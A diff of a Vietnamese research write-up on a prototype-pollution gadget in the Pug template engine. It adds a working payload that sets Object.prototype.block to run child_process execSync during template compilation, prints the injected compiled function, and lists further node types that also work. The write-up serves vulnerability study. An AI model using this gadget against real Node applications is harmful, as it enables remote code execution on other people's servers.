@@ -150,7 +150,59 @@ Một số hàm gen code với các type
 ## Exp
 Payload Prototype Injection
 ```
+const pug = require('pug');
 Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};
-
+pug.compile('h1= msg', {debug:true});
 ```
-Tại sao ở đây lại chọn Text mà không phải các type khác:
+Template Function được trả về đã được injection
+```
+Compiled Function:
+
+  function template(locals) {var pug_html = "", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;
+      var locals_for_with = (locals || {});
+      
+      (function (console, msg, process) {
+        ;pug_debug_line = 1;
+  pug_html = pug_html + "\u003Ch1\u003E";
+  ;pug_debug_line = 1;
+  pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? "" : pug_interp));
+  ;pug_debug_line = console.log(process.mainModule.require('child_process').execSync('id').toString());
+  pug_html = pug_html + "ndefine\u003C\u002Fh1\u003E";
+      }.call(this, "console" in locals_for_with ?
+          locals_for_with.console :
+          typeof console !== 'undefined' ? console : undefined, "msg" in locals_for_with ?
+          locals_for_with.msg :
+          typeof msg !== 'undefined' ? msg : undefined, "process" in locals_for_with ?
+          locals_for_with.process :
+          typeof process !== 'undefined' ? process : undefined));
+      ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
+```
+
+Lúc này trong đầu mình có câu hỏi tại sao lại là type Text chứ không phải các type khác và liệu có type nào còn có thể khai thác được không.
+Sau 1 hồi debug thì mình tìm ra được các type có thể lợi dụng cần phải thỏa mãn 2 điều kiện:
+* Có hàm visit*Type* (visitCode, visitTag, ..)
+* Thuộc các case sau để tránh gọi đến hàm walkAST 1 lần nữa và mình tìm thêm được 1 số type hợp lệ.
+```
+    case 'Attrs':
+    case 'BlockComment': // work
+    case 'Comment': // work
+    case 'Doctype': // work
+    case 'IncludeFilter':
+    case 'MixinBlock': // work
+    case 'YieldBlock': // work 
+    case 'Text': // 
+      break;
+```
+Liệu payload trên có hoạt động với mọi template không? => Câu trả lời là không nếu template không tham chiếu đến giá trị nhận từ argument.( điều này khó xảy ra vì nếu không tham chiếu đến đến các biến được truyền vào thì đã không sử dụng template từ ban đầu)
+Ví dụ về một template mà payload trên không hoạt động.
+```
+pug.compile('h1', {debug:true})
+----------------------------------
+Compiled Function:
+
+  function template(locals) {var pug_html = "", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;pug_debug_line = 1;
+  pug_html = pug_html + "\u003Ch1\u003E\u003C\u002Fh1\u003E";} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
+```
+
+Tuy nhiên mình phát hiện ngay cả trong trường hợp trên, ta vẫn có thể khai thác được cũng bằng Prototype Pollution và mình để tự bạn tìm ra câu trả lời cho trường hợp trên. (dễ quá nó chán lắm 😂😂)
+![](tem.png)
